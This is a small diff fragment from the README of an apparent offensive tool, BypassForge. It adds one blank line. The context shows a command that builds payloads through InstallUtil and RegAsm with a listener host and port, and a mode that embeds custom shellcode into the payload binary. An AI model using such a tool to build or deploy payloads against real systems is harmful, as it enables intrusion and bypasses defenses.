@@ -10,6 +10,7 @@ python BypassForge.py -b InstallUtil,RegAsm -lh 127.0.0.1 -lp 8080 --payload win
 ```
 ![image](https://github.com/user-attachments/assets/047de769-d90f-4350-b7c9-96ce3382d891)
 
+
 - **Custom Shellcode Mode**
 Custom shellcode which are created using 3rd party tools like micr0_shell (https://github.com/senzee1984/micr0_shell) or manually created is specified. This shellcode is added to the final payload binary.
 ```
